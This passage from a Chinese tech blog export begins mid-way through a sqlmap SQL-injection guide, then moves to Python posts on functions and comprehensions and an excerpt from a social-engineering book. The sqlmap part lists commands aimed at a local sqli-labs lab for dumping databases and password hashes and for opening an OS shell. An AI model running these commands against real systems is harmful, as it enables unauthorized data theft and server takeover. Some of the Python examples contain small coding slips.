在有些时候，需要根据某个参数的变化，而修改另个一参数，才能形成正常的请求，这时可以用–eval参数在每次请求时根据所写python代码做完修改后请求。(e.g “import hashlib;id2&#x3D;hashlib.md5(id).hexdigest()”)sqlmap.py -u&quot;http://www.target.com/vuln.php?id=1&amp;amp;hash=c4ca4238a0b923820dcc509a6f75849b&quot;--eval=&quot;import hashlib;hash=hashlib.md5(id).hexdigest()&quot;\n\n优化参数通过优化参数的设置优化sqlmap性能\n\n-o                  打开所有的优化开关\n–predict-output    预测普通查询输出\n–keep-alive        使用持久HTTP（S）连接\n–null-connection   获取页面长度\n–threads&#x3D;THREADS   当前http(s)最大请求数 (默认 1)\n\n注入参数通过注入参数指定要测试的参数并提供注入有效载荷和可选的篡改脚本\n\n-p TESTPARAMETER    可测试的参数\n–skip&#x3D;SKIP         跳过对给定参数的测试\n–skip-static       跳过测试不显示为动态的参数\n–param-exclude&#x3D;..  使用正则表达式排除参数进行测试（e.g. “ses”）\n–dbms&#x3D;DBMS         强制后端的DBMS为此值\n–dbms-cred&#x3D;DBMS..  DBMS认证凭证(user:password)\n–os&#x3D;OS             强制后端的DBMS操作系统为这个值\n–invalid-bignum    使用大数字使值无效\n–invalid-logical   使用逻辑操作使值无效\n–invalid-string    使用随机字符串使值无效\n–no-cast           关闭有效载荷铸造机制\n–no-escape         关闭字符串逃逸机制\n–prefix&#x3D;PREFIX     注入payload字符串前缀\n–suffix&#x3D;SUFFIX     注入payload字符串后缀\n–tamper&#x3D;TAMPER     使用给定的脚本篡改注入数据\n\n检测参数通过检测参数指定在盲注的时候如何解析和比较HTTP响应页面的内容\n\n–level&#x3D;LEVEL       执行测试的等级（1-5，默认为1）\n–risk&#x3D;RISK         执行测试的风险（0-3，默认为1）\n–string&#x3D;STRING     查询时有效时在页面匹配字符串\n–not-string&#x3D;NOT..  当查询求值为无效时匹配的字符串\n–regexp&#x3D;REGEXP     查询时有效时在页面匹配正则表达式\n–code&#x3D;CODE         当查询求值为True时匹配的HTTP代码\n–text-only         仅基于在文本内容比较网页\n–titles            仅根据他们的标题进行比较\n\n技巧参数通过技巧参数调整SQL注入的测试方式\n\n–technique&#x3D;TECH    SQL注入技术测试（默认BEUST）\nB    布尔盲注\nE    报错盲注\nU    联表注入\nS    堆叠注入\nT    时间盲注\n\n\n–time-sec&#x3D;TIMESEC  DBMS响应的延迟时间（默认为5秒）\n–union-cols&#x3D;UCOLS  定列范围用于测试UNION查询注入\n–union-char&#x3D;UCHAR  暴力猜测列的字符数\n–union-from&#x3D;UFROM  SQL注入UNION查询使用的格式\n–dns-domain&#x3D;DNS..  DNS泄露攻击使用的域名\n–second-order&#x3D;S..  URL搜索产生的结果页面\n\n指纹参数通过指纹参数让SQLMap扫描时执行广泛的DBMS版本指纹检查\n\n-f, –fingerprint   执行广泛的DBMS版本指纹检查\n\n枚举参数通过枚举参数列举后端DBMS的库，表，字段的结构与数据，以及运行自定义SQL语句\n\n-a, –all           获取所有信息\n-b, –banner        获取数据库管理系统的标识\n–current-user      获取数据库管理系统当前用户\n–current-db        获取数据库管理系统当前数据库\n–hostname          获取数据库服务器的主机名称\n–is-dba            检测DBMS当前用户是否DBA\n–users             枚举数据库管理系统用户\n–passwords         枚举数据库管理系统用户密码哈希\n–privileges        枚举数据库管理系统用户的权限\n–roles             枚举数据库管理系统用户的角色\n–dbs               枚举数据库管理系统数据库\n–tables            枚举的DBMS数据库中的表\n–columns           枚举DBMS数据库表列\n–schema            枚举数据库架构\n–count             检索表的项目数，有时候用户只想获取表中的数据个数而不是具体的内容，那么就可以使用这个参数：sqlmap.py -u url - –count -D testdb\n–dump              转储数据库表项\n–dump-all          转储数据库所有表项\n–search            搜索列（S），表（S）和&#x2F;或数据库名称（S）\n–comments          获取DBMS注释\n-D DB               要进行枚举的指定数据库名\n-T TBL              DBMS数据库表枚举\n-C COL              DBMS数据库表列枚举\n-X EXCLUDECOL       DBMS数据库表不进行枚举\n-U USER             用来进行枚举的数据库用户\n–exclude-sysdbs    枚举表时排除系统数据库\n–pivot-column&#x3D;P..  Pivot columnname\n–where&#x3D;DUMPWHERE   Use WHEREcondition while table dumping\n–start&#x3D;LIMITSTART  获取第一个查询输出数据位置\n–stop&#x3D;LIMITSTOP    获取最后查询的输出数据\n–first&#x3D;FIRSTCHAR   第一个查询输出字的字符获取\n–last&#x3D;LASTCHAR     最后查询的输出字字符获取\n–sql-query&#x3D;QUERY   要执行的SQL语句\n–sql-shell         提示交互式SQL的shell\n–sql-file&#x3D;SQLFILE  要执行的SQL文件\n\n暴力参数通过暴力参数让SQLMap执行暴力检查\n\n–common-tables     检查存在共同表\n–common-columns    检查存在共同列\n\n自定义函数参数通过自定义函数参数为SQLMap创建用户自定义函数\n\n–udf-inject        注入用户自定义函数\n–shared-lib&#x3D;SHLIB  共享库的本地路径\n\n特殊操作选项参数通过特殊操作选项参数令SQLMap执行远程访问等特殊操作\n访问文件系统通过这些参数可以访问后端文件系统\n\n–file-read&#x3D;RFILE   从后端的数据库管理系统文件系统读取文件，SQL Server2005中读取二进制文件example.exe: sqlmap.py -u&quot;http://192.168.136.129/sqlmap/mssql/iis/get_str2.asp?name=luther&quot;--file-read &quot;C:/example.exe&quot; -v 1\n–file-write&#x3D;WFILE  编辑后端的数据库管理系统文件系统上的本地文件\n–file-dest&#x3D;DFILE   后端的数据库管理系统写入文件的绝对路径\n\n访问操作系统通过这些参数访问后端操作系统\n\n–os-cmd&#x3D;OSCMD      执行操作系统命令（OSCMD）\n–os-shell          交互式的操作系统的shell\n–os-pwn            获取一个OOB shell，meterpreter或VNC\n–os-smbrelay       一键获取一个OOBshell，meterpreter或VNC\n–os-bof            存储过程缓冲区溢出利用\n–priv-esc          数据库进程用户权限提升\n–msf-path&#x3D;MSFPATH  MetasploitFramework本地的安装路径\n–tmp-path&#x3D;TMPPATH  远程临时文件目录的绝对路径\n\n访问Windows注册表通过这些参数访问后端Windows系统的注册表\n\n–reg-read          读一个Windows注册表项值\n–reg-add           写一个Windows注册表项值数据\n–reg-del           删除Windows注册表键值\n–reg-key&#x3D;REGKEY    Windows注册表键\n–reg-value&#x3D;REGVAL  Windows注册表项值\n–reg-data&#x3D;REGDATA  Windows注册表键值数据\n–reg-type&#x3D;REGTYPE  Windows注册表项值类型\n\n其他参数\n-z MNEMONICS        使用短记忆法 (e.g.”flu,bat,ban,tec&#x3D;EU”)\n–alert&#x3D;ALERT       发现SQL注入时，运行主机操作系统命令\n–answers&#x3D;ANSWERS   当希望sqlmap提出输入时，自动输入自己想要的答案(e.g. “quit&#x3D;N,follow&#x3D;N”)，例如：sqlmap.py -u&quot;http://192.168.22.128/get_int.php?id=1&quot;--technique=E--answers=&quot;extending=N&quot;    --batch\n–beep              发现sql注入时，发出蜂鸣声。\n–cleanup           清除sqlmap注入时在DBMS中产生的udf与表。\n–dependencies      Check formissing (non-core) sqlmap dependencies\n–disable-coloring  默认彩色输出，禁掉彩色输出。\n–gpage&#x3D;GOOGLEPAGE  使用前100个URL地址作为注入测试，结合此选项，可以指定页面的URL测试\n–identify-waf      进行WAF&#x2F;IPS&#x2F;IDS保护测试，目前大约支持30种产品的识别\n–mobile            有时服务端只接收移动端的访问，此时可以设定一个手机的User-Agent来模仿手机登陆。\n–offline           Work inoffline mode (only use session data)\n–purge-output      从输出目录安全删除所有内容，有时需要删除结果文件，而不被恢复，可以使用此参数，原有文件将会被随机的一些文件覆盖。\n–skip-waf          跳过WAF／IPS &#x2F; IDS启发式检测保护\n–smart             进行积极的启发式测试，快速判断为注入的报错点进行注入\n–sqlmap-shell      互动提示一个sqlmapshell\n–tmp-dir&#x3D;TMPDIR    用于存储临时文件的本地目录\n–web-root&#x3D;WEBROOT  Web服务器的文档根目录(e.g.”&#x2F;var&#x2F;www”)\n–wizard            新手用户简单的向导使用，可以一步一步教你如何输入针对目标注入\n\n攻击流程\n常见用法对目标url进行SQL注入 (GET)sqlmap -u &quot;http:/localhost/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;\n对目标url进行SQL注入 (POST)sqlmap -u &quot;http:/localhost/sqli-labs-master/sqli-labs-master/Less-1&quot;  --data=&quot;id=1&quot;\n对目标url进行cookie注入sqlmap -u &quot;http:/localhost/sqli-labs-master/sqli-labs-master/Less-1&quot;  --cookie=&quot;id=1&quot; --level=2 (大于等于二即可)\n对目标url进行User-Agent注入sqlmap -u &quot;http:/localhost/sqli-labs-master/sqli-labs-master/Less-1&quot;  --level=3(大于等于三即可)\n利用抓包获取的报文进行注入sqlmap -r ./httprequest.txt\n脱库sqlmap -u &quot;http:/localhost/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; -a\n爆用户sqlmap -u &#39;http:/localhost/sqli-labs-master/sqli-labs-master/Less-1/?id=1&#39; --userssqlmap -u &#39;http:/localhost/sqli-labs-master/sqli-labs-master/Less-1/?id=1&#39; --current-user\n爆用户密码sqlmap -u &#39;http:/localhost/sqli-labs-master/sqli-labs-master/Less-1/?id=1&#39; --passwords\n爆用户权限sqlmap -u &#39;http:/localhost/sqli-labs-master/sqli-labs-master/Less-1/?id=1&#39; --privileges\n爆主机名sqlmap -u &#39;http:/localhost/sqli-labs-master/sqli-labs-master/Less-1/?id=1&#39; --hostname\n爆库sqlmap -u &quot;http:/localhost/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; --dbs  --batchsqlmap -u &quot;http:/localhost/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; --current-db  --batch\n爆表sqlmap -u &quot;http:/localhost/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; -D DATABASENAME --tables --batch\n爆列sqlmap -u &quot;http:/localhost/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; -D DATABASENAME -T TABLENAME --columns   --batch\n爆字段类型sqlmap -u &#39;http:/localhost/sqli-labs-master/sqli-labs-master/Less-1/?id=1&#39; -D DATABASENAME --schema\n爆字段值sqlmap -u &quot;http:/localhost/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; -D DATABASENAME -T TABLENAME -C COLUMNNAME     --dump  --batch\n获取Shellsqlmap -u &quot;http:/localhost/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;  --os-shell\nReferencehttps://www.freebuf.com/sectool/321598.htmlhttps://www.freebuf.com/sectool/164608.htmlhttps://www.cnblogs.com/cscshi/p/15705030.htmlhttps://www.anquanke.com/post/id/160636https://zhuanlan.zhihu.com/p/377428620https://zhuanlan.zhihu.com/p/145483801\n","categories":["Tech Blog"]},{"title":"To Be Python Ⅲ 函数","url":"/2024/02/14/Tech%20Blog/To-Be-Python-%E2%85%A2/","content":"\n\n不要把函数返回的多个数值拆分到三个以上的变量中函数返回多个返回值时实际上是返回了一个元组，同时返回的返回值就是元组中的元素。由于Python 中存在 unpacking 机制，函数返回的多个返回值组成的元组可以被等号左边的变量接收。当函数存在较多返回值时，接收返回值时很容易出现搞错顺序导致出错或代码过长而看起来很别扭的情况。为了避免这些问题，最好不要吧函数返回的多个值拆分到三个以上的变量里，如果要拆分的值确实很多，最好定义一个轻便的类或 namedtuple ，并让函数返回这样的实例\n\n\n遇到意外情况应该返回异常而非返回 None编写工具函数时，许多 Python 程序员喜欢用 None 这个返回值表示特殊情况。在一些情况下，这样做是有道理的。例如我们需要编写一个辅助函数计算两数相除的结果。在除数是 0 的情况下，返回 None 似乎相当合理，因为这种除法是没有意义的。\ndef devide(a,b):    try:        return a/b    except ZeroDivisionError:        return None\n\n针对这个辅助函数的处理方式可能是\nx , y = 1 , 0result = devide(x,y)if not result :    print(&quot;Invalid input&quot;)\n\n但如果这个函数的被除数为 0 ，那么函数的返回结果为 0 ，但此时程序也会输出 “Invalid input”。这样的写法经常出现在 Python 代码中，因此像 devide 函数这样用 None 表示特殊状态的函数很容易出错。有两种办法可以减少这样的错误：第一种方法是，利用二元组把计算的结果分成两部分返回，元组的首个元素表示操作是否成功，第二个元素表示计算的实际值。这样写可以促使调用函数的人去拆分返回值，他可以先看看这次运算是否成功，然后决定怎么处理运算结果\nsuccess , result = devide(x,y)if not success:    print(&quot;Invalid input&quot;)\n\n但问题是，有一些调用方总喜欢忽略返回元组的第一个部分，这样写成的代码乍一看没有问题，但还是存在无法区分返回 0 和返回 None 这两种情况\n_ , result = devide(x,y)if not result:    print(&quot;Invalid input&quot;)\n\n第二种方法比第一种更好，就是不采用 None 表示特例，而是向调用方抛出异常或将异常向上传递，让调用方去处理，也就是\ndef devide(x,y):    try:        return a / b    except ZeroDivisionError:        raise ValueError(&quot;Invalid inputs&quot;)\n\n这样，只要函数能拿到返回值，就说明函数肯定顺利执行完了，所以只需要用 try 把函数包起来并在 else 块中处理玉暖结果即可，输入、输出与异常都很清晰，可以大大减小调用方出错的概率\n在闭包里使用外围作用域中的变量又是我们要给列表中的元素排序，而且要优先把某个群组之中的元素放在其他元素的前面。例如，渲染用户界面的时候，关键的信息和特护的时间应该优先显示在其他信息之前。实现这种做法的一种常见方案，是通过辅助函数通过 key 参数传给列表的 sort 方法，让这个方法根据辅助函数所返回的值决定元素在列表中的先后顺序。这一功能建立在，体现在 Python 支持闭包，函数在 Python 里是头等对象等 Python 对函数式编程的支持上。在表达式中引用某个变量时，Python 解释器会按照下面的顺序，在各个作用域里面查找这个变量，以解析这一引用:\n\n当前函数的作用域\n外围作用域（例如包含按当前函数的其他函数所对应的作用域）\n包含当前代码的哪个模块所对应的作用域（也叫全局作用域）\n内置作用域（built-in scope ,也就是包含 len 与 str 等函数的那个作用）\n\n这是变量出现在赋值符号右边时，怎么认定。而当变量出现在赋值符号左边，也就是当我们给变量赋值时，需要分两种情况处理。如果变量已经定义在当前作用域中，那么直接把新值交给它即可。如果不存在这个变量，那么即便外围作用域中有同名的变量，Python 还是会把这一赋值操作当成变量的定义来处理。这会产生一个重要的效果，也就是说，Python 会把包含赋值操作的这个函数当成新定义的这个变量的作用域。这种问题又是也称做作用域bug ( scoping bug ),Python 新手可能认为这样的赋值规则很奇怪，但实际上 Python 是故意这样设计的。因为这样可以防止函数中的局部变量污染外围模块。加入不这样做，那么函数中的每条赋值语句都有可鞥影响全局作用域的变量，这样不仅混乱，而且会让全局变量之间彼此交互影响，从而导致很多难以探查的 bug\nPython 有一种特殊的写法，可以把闭包里面的数据赋给闭包外面的变量——用 nonlocal 语句描述变量，就可以让 Python 在处理这个变量的赋值操作时，去外围作用域查找。不过 nonlocal 有一个限制，就是不能侵入模块级别的作用域，以防污染全局作用域。nonlocal 语句可以清楚地表明，我们要把数据赋给闭包之外的变量，一个与它互补的语句，叫做 global ， 用 global 描述某个变量后，在这个变量赋值时，Python 会直接把它放到全局作用域中\n但全局变量显然不应该滥用，nonlocal 最好只使用在简单的函数中，因为它造成的副作用又是很难发现。尤其是在那种比较长的函数里，nonlocal 语句与其关联变量的赋值操作之间可能隔得很远\n用数量可变的位置参数给函数设计清晰的参数列表让函数接收数量可变的位置参数，可以把函数设计得更加清晰(这些位置参数通常简称 varargs,或者叫做 star arg,因为我们习惯用*args指代)。在很多情况下我们都无法确认有多少需要传给函数的参数，或者其实没有参数需要传入，但我们也必须传一个值给函数。使用位置参数与用在赋值语句左边的 unpacking 操作非常相似。而如果在传递参数时，想要把一个序列的所有元素都作为参数传递给函数，可以对序列使用*操作符让 Python 把序列中的元素都当成位置参数传给这个函数。\n让函数接收数量可变的位置参数，可能导致两个问题：\n第一个问题是，程序总是必须先把这些参数转化成一个元组，然后才能把它们当成可选的位置参数传给函数。这意味着，如果调用函数时，把带*操作符的生成器传了过去，那么程序必须先把这个生成器里的所有元素迭代玩以便形成元组，然后才能继续往下执行。这个元组包含生成器所给出的每个值，这可能耗费大量内存，甚至会让程序崩溃。接收*args参数的函数，适合处理输入值不太多，而且数量可以提前预估的情况。在调用这种函数时，传给*args这一部分的应该是许多个字面值或变量名。\n第二个问题是，如果用了 *args 之后，又要给函数添加新的位置参数，那么原有函数的所有操作都需要更新，这容易导致一些很难排查的 bug 。为了避免这种漏洞，在给这种函数添加参数时，应该使用只能通过关键字来指定的参数 ( keyword-only argument )。如果想做的更稳妥一些，可以添加类型注解\n用关键字参数来表示可选行为Python 允许在调用函数时按照位置传递参数。除了按位置传递外，还可以按关键字传递。如果两种方式混用，位置参数必须出现在关键字参数之前，否则会出错。每个参数只能指定一次，不能既通过位置指定，又通过关键字指定。如果有一份字典，而且字典里面的内容能够用来调用函数，即字典的 key 与函数的参数名一致，那么可以通过 ** 运算符让 Python 把字典里的键值对以关键字参数的形式传给函数。这种调用方式也可以和位置参数或关键字参数混用，只要不重复指定即可。\n最推荐使用的关键字参数的灵活用法可以带来三个好处：\n第一个好处是，用关键字参数调用函数可以提高代码的可读性，每个参数的含义都相当明了\n第二个好处是，它可以带有默认值(设置为可选参数)，该值在函数定义时指定，有效减少重复代码使代码看上去更干净\n第三个好处是，开发者可以很灵活地拓展函数的参数，而不用担心会影响原有的函数调用代码，并有助于维护向后兼容\n用 None 和 docstring 描述默认值会变的参数可选参数的默认值可以被设置为一些函数的返回值。例如将 time 参数的默认值设置为 datetime.datetime.now() ，Python 会默认把调用函数的这一刻，也就是触发事件的那一刻的值作为 time 参数的默认值，而不会每一次调用函数都重新执行 now 函数重新计算。\n要想在 Python 中实现默认值会变的参数，惯用的解决方案是把参数的默认值设置为 None ，同时在 docstring 文档里写明这个参数为 None 时函数的运作方式。把参数的默认值写成 None 还有个重要的意义，就是用来表示那种以后可能由调用者修改内容的默认值。例如对于这样一段代码\ndef test(arg = &#123;&#125;):    print(arg)    return argfoo = test()foo[&#x27;a&#x27;] = &#x27;a&#x27;bar = test()bar[&#x27;b&#x27;] = &#x27;b&#x27;print(foo)print(bar)#&#123;&#125;#&#123;&#x27;a&#x27;: &#x27;a&#x27;&#125;#&#123;&#x27;a&#x27;: &#x27;a&#x27;, &#x27;b&#x27;: &#x27;b&#x27;&#125;#&#123;&#x27;a&#x27;: &#x27;a&#x27;, &#x27;b&#x27;: &#x27;b&#x27;&#125;\n\n我们的本意是通过这两次调用得到两个空白字典，分别用于存放对应的数据。但实际上，只要修改其中一个字典，另一个字典的内容就会受影响。这实际上是因为 foo 和 bar 实际上是同一个字典，即 Python 一开始给 default 参数确认默认值时分配的字典。它们表示的时同一个字典对象。要解决这个问题，可以使用上述方式把默认值设置为 None 解决\n用只能以关键字指定和只能按位置传入的参数设计清晰的参数列表在定义函数时，可以使用 * 符号把参数分成两组，* 左边的参数和普通参数相同，而星号右边的参数只能用关键字指定参数的方式进行传参。\nPython 3.8 引入了一项新特性，即只能按照位置传递的参数，与 * 类似，开发者可以使用 &#x2F; 符号，使得位于它左边的参数只能由位置指定，对于以下代码\ndef function(arg1,arg2,/,arg3,arg4,*,arg5,arg6)\n\n位于 &#x2F; 左侧的参数时只能按位置指定的参数，位于 * 符号右侧的参数则是只能按关键字形式指定的参数，位于两个符号之间的参数，则是普通的既可以按照位置又可以按照关键字形式指定的参数\n用 functools.wraps 定义函数修饰器使用高级函数包装函数后，对象序列化器或一些其他的函数相关的工具例如内置的 help 函数会无法正常运作，因为它不能确定受修饰的那个原始函数的位置。要想解决这些问题，可以改用 functool 内置模块之中的 wraps 辅助函数实现，这个修饰器可以把重要的元数据从内部函数复制到外部函数。除了它们之外，Python 函数还有很多标准属性，例如 __name__,__module__,__annotations__也应该在封装时进行保留，才能让相关接口正常运作。wraps 可以帮助保留这些属性，使程序表现出正确的行为\n","categories":["Tech Blog"]},{"title":"To be Pythonic Ⅳ 推导与生成","url":"/2024/02/22/Tech%20Blog/To-Be-Pythonic-%E2%85%A3/","content":"我们经常需要处理 list 、 dict 和 set 等数据结构，并以这种处理逻辑为基础构建程序。Python 提供了一种特殊的写法，叫做推导 (comprehension) ，可以简洁地迭代这些结构，并根据迭代结果派生出另一套数据。Python 还将这一理念运用到了函数上，也就是生成器。泛式可以使用迭代的任务都支持生成器函数(例如循环，带星号的表达式等)。生成器可以提升性能，减少内存用量并提升代码的可读性，是 Pythonic Code 的鲜明特征\n\n用列表推导取代 map 与 filter假设我们要用一个列表中的每个元素的平方值构建一份新的列表\n传统的写法是\nexample = [1,2,3,4,5,6,7]squares = []#version 1for x in example:    squares.append(x**2)#version 2squares = map(lambda x:x**2,a)\n\n但如果使用列表推导表达式的话，可以写为\nexample = [1,2,3,4,5,6,7]squares = [x**2 for x in a]\n\n相较之下后者显然会更加简洁已读，这一差距会在更复杂的情况下变得显著。例如，这个新列表只需要纳入源列表中的偶数的平方时，传统的写法是\n#version 1for x in example:    if x % 2 == 0:        squares.append(x**2)#version 2squares = map(lambda x:x**2,filter(lambda x:x % 2 == 0,a))\n\n而使用列表推导表达式的话则可以写为\nsquares = [x**2 for x in a if x % 2 == 0]\n\n字典与集合也有相应的推导机制，例如\n# traditionalsquares_dict = dict(map(lambda x:(x,x**2),filter(lambda x: x % 2 == 0,a)))squares_set = set(map(lambda x:x**2,filter(lambda x:x % 2 == 0,a)))# comprehensionsquares_dict = &#123;x:x**2 for x in a if x % 2 == 0&#125;squares_set =&#123;x**2 for x in a if x % 2 == 0&#125;\n\n相比之下显然推导式要更为直观好懂\n控制推导逻辑的子表达式不应该超过两个除了最基本的写法外，推导式还支持多层循环，例如要把矩阵转化成普通的一维列表，可以在推导时使用两个 for 表达式，这些表达式会按照从左到右的顺序执行\nmatrix = [    [1,2,3],    [4,5,6],    [7,8,9]    ]flat = [x for row in matrix for x in row]\n\n这样写简单易懂，也是多层循环在列表推导之中的合理用法。它还可以通过嵌套推导逻辑构建二维数组，例如\nsquares = [[x**2 for x in row] for row in matrix]\n\n当然，相较于只有一层循环的推导式而言，有着多层循环的推导逻辑相较而言已经开始有了可读性的下降。因此，在表示推导逻辑时，最多只应该写两个子表达式，也就是 for 和 if 不应该超过两对。面对更为复杂的问题情景时，应考虑使用辅助函数或普通的 for 和 if 语句实现\n用赋值表达式消除推导中的重复代码对于以下代码\nstock = &#123; ... &#125;order = [ ... ]def func(value) -&gt; Optional[int]:    ...result = &#123;&#125;for key in order:    foo = stock.get(key,0)    bar = func(foo)    if bar:        result[key] = bar\n\n我们很容易想到用字典推导表达式改写为\nresult = &#123;            key:func(stock.get(key,0))             for key in order             if func(stock.get(key,0))        &#125;\n\n但这段代码看的人恨不舒服，原因是它会重复计算 func(stock.get(key,0)) , 同时如果我们需要对代码进行修改时，如果忘记对两处代码同步修改，很容易导致一些奇怪的 bug 。用于解决的这个问题的方案是使用 Python 3.8 引入的海象计算符 := 进行赋值\nresult = &#123;            key:value             for key in order             if value := func(stock.get(key,0))        &#125;\n\n赋值表达式被我们写在了子表达式中，这是显然的。从推导表达式的执行流程我们不难想到子表达式会被先求值，若将赋值表达式写在 for 的前面，则子表达式中就会出现变量未定义引起的错误。而如果推导逻辑不带条件，而表示新值的部分使用了 := 操作符，那么操作符左边的变量就会泄漏到包含这条推导语句的作用域中，与 for 循环中的循环变量类似\nfoo = [1,2,3,4,5,6,7]bar = [y := x+1 for x in foo]print(f&quot;The last one in bar is &#123;y&#125;&quot;)for y in foo:    passprint(f&quot;The last one in foo is &#123;y&#125;&quot;)#The last one in bar is 8#The last one in foo is 7\n\n不过，在上面的代码中，推导语句中的 for 循环所使用的循环变量 ( x ) 不会泄露到外部作用域。为了避免循环变量的泄露，建议赋值表达式只出现在推导逻辑的条件之中\n\n在最新的 Python 里，即便这样写变量似乎还是会泄漏到外部，参见 PEP 572 和作者勘误\n\n让函数返回迭代器而非直接返回列表如果函数要返回的是包含了许多结果的序列，那么最简单的办法是将这些结果放到列表中，例如\ndef get_index(some_list) -&gt; list:    indexes = []    for index , _ in enumerate(some_list):        indexes.append(index)    return indexes\n\n使用生成器的写法是\ndef get_index(some_list) -&gt; Generator[int,Any,None]:    for index,_ in enumerate(some_list):        yield index\n\n相比于迭代列表等数据结构，迭代迭代器有着显著的优势，一是迭代器不会像列表一样占用宝贵的内存空间，这在列表很大的时候尤其重要，同时迭代器是惰性的，其中的代码不会立即执行，而是在需要的时候才执行，他不需要全部读取整个输入值，也不用一次星计算出所有的输出。与传统编程语言例如 C 语言那样的通过索引进行循环的方式相比，迭代器也不需要进行边界检查。这些特性为迭代器带来了优异的的性能表现。调用者唯一需要注意的是，迭代器是有状态的，这意味着同一迭代器不能重复使用\n用生成器表达式改写数据量较大的列表推导当直接使用列表推导表达式生成的列表可能会过大时，可以考虑使用生成器表达式来完成对应的任务。程序在对生成器表达式求值的时候，并不会直接构建出生成式描述的序列，而是生成一个迭代器，该迭代器会根据表达式中的逻辑生成对应值。生成器表达式的语法与列表推导式类似，只是生成器表达式会被写在圆括号内。唯一需要注意的是生成器表达式返回的迭代器是有状态的，不可重复使用\n不要用 send 给生成器注入数据Python 的迭代器支持 send 方法，这可以让迭代器变成双向通道。send 方法可以把参数发给迭代器，让它成为上一条 yield 表达式的求值结果，并获取迭代器下一个生成的值。另外一个内置函数 next 等价于 send(None) 。由于刚开始使用迭代器时它是从头执行的，并没有从某一条 yield 表达式开始执行，因此首次调用 send 方法时只能传 None ，否则程序会抛出异常。send 方法不适合与 yield from 表达式搭配起来使用，可能导致奇怪的结果，例如会让程序在本该输出有效值的时候输出 None 。一种更简单好用的方法是封装它，通过迭代器向组合起来的生成器主数据，这样迭代器可以来自任何地方，并且完全可以是动态的，不过这个方案有一个缺陷，就是必须假设负责输入的生成器绝对能保证线程安全，但有时我们不能保证这一点\n不要通过 throw 变换生成器的状态生成器生成的迭代器有着 throw 方法，可以往迭代器内注入异常，当迭代器开始迭代时，会在上一次执行后停留的 yield 表达式处抛出 throw 方法注入的异常。生成器函数可以用 try&#x2F;except 复合语句把 yield 表达式包裹起来，如果函数上次执行到了这条表达式处，而这次即将继续执行时，发现外界通过 throw 方法给自己注入了异常，这个异常就会被 try 结构捕获，如果捕获之后不继续抛出异常，则生成器函数会和正常情况一样推进到下一条 yield 表达式\ndef foo():    yield 1    try:        yield 2    except Exception as e:        print(f&quot;&#123;e&#125;&quot;)    else:        yield 3    yield 4bar = foo()print(next(bar))print(next(bar))print(bar.throw(Exception(&quot;Error!&quot;)))# 1# 2# Error!# 4   \n\n但凡是需要用生成器和异常实现的功能，通常都可以改用异步机制或者可迭代的容器对象(也就是用类的 __iter__ 方法实现生成器，并专门提供一个方法让调用者触发这种特殊的状态变换逻辑)更好地实现。通过 throw 方法诸如一场会让代码变得难懂，因为我们往往需要用多层嵌套的模板结构来抛出并捕获这种异常。故最好不要通过 throw 方法变换生成器的状态\n使用 itertools 拼装迭代器与生成器Python 内置的 itertools 模块里有很多函数，可以用来安排迭代器之间的交互关系\n连接多个迭代器chainchain 函数接收多个可迭代对象作为参数，并返回一个将它们从头到尾连成的迭代器\nrepeatrepeat 函数接收两个参数，可以生成一个将第一个参数重复生成第二个参数次数的迭代器，第二个参数为空时则默认无重复次数上限\ncyclecycle 函数接收一个可迭代参数，生成一个不断循环生成参数中各项元素的迭代器\nteetee 函数可以将一个迭代器分裂成多个平行的迭代器，分裂出的个数由第二个参数指定\nzip_longest该函数与 Python 内置的 zip 函数类似，但它会在原迭代器长不够时用 fillvalue 参数的值填补提前耗尽的迭代器留下的空缺\n过滤源迭代器中的元素isliceislice 函数可以在不拷贝数据的前提下按照下标切割原迭代器，其使用方式与标准的序列切片及步进机制类似，即 islice(iterable,begin,end,step),当除迭代器外只提供一个参数时该参数表示切割的终点\ntakewhiletakewhile 函数接收一个函数和一个迭代器为参数，会一直从原迭代器中获取元素直到最新获取到的元素让提供的函数返回 False 为止。\ndropwhile与 takewhile 函数相反，dropwhile 函数会一直跳过源迭代器里的元素，直到某元素让提供的函数返回 True 为止，然后它会从这个地方开始取值\nfilterfalsefilerfalse 函数和内置的 filter 函数相反，它会逐个输出源迭代器里使得提供的函数返回 False 的元素\n用源迭代器中的元素合成新元素accumulateaccumulate 函数会从源迭代器中取出一个元素，并把已经累计的结果与这个元素一起传给表示累加逻辑的函数，然后输出那个函数的计算结果，并把结果当成新的累计值，默认累计逻辑为两值相加\nproductproduct 会从一个或多个源迭代器里获取元素，并计算笛卡尔积，它可以取代多层嵌套的列表推导代码\npermutationspermutations 函数会考虑源迭代器所能给出的全部元素，并逐个输出由其中的 N 个元素形成的每种有序排列方式，N由第二个参数指定\ncombinationscombinations 函数会考虑源迭代器所能给出的全部元素，并逐个输出由其中的 N 个元素形成的每种无序组合方式，N由第二个参数指定\ncombinations_with_replacement该函数与 combinations 函数类似，但它允许同一个元素在组合里多次出现\n","categories":["Tech Blog"]},{"title":"《反欺骗的艺术》摘抄其一","url":"/2021/01/31/Tech%20Blog/%E3%80%8A%E5%8F%8D%E6%AC%BA%E9%AA%97%E7%9A%84%E8%89%BA%E6%9C%AF%E3%80%8B%E6%91%98%E6%8A%84%E5%85%B6%E4%B8%80/","content":"科技的发展已经完全改变了人们的生活方式，尤其是电话和网络的普及，一方面缩短了人与人之间的距离，另一方面则导致信任关系的复杂化。在面对面的情况下，人们可以凭借自己的生活经验，以及对物理安全的感知来判断是否可以信任对方；但在电话或者网络上，生活中的经验不足以提供这样的依据，并且物理安全未受到威胁，于是人们变得轻信和盲从，毕竟人们宁可相信这个世界上诚实的人更多一些。\n\n\n在数字世界中，科学研究人员一直在努力寻求最佳的信息保护方案，甚至已经找到了可以实现理论上绝对安全的量子密码方法，大多数企业信息系统已经融入了先进的，成熟的研究成果，因而，在一定的假设条件下， 这些信息系统可以被证明是安全的。然而，理论上的安全和与现实生活中的安全有很大的差距。首先，理论安全的假设条件并不总是切实可行，甚至屡屡被违反，比如，让每个人都维护一个强密码并不是那么容易做到的。其次，在实现信息系统的过程中，由于软件技术方面的原因，也会出现新的安全漏洞。 ———–译者序（潘爱民）\n社交工程学是利用人性的BUG和漏洞实现入侵的技术 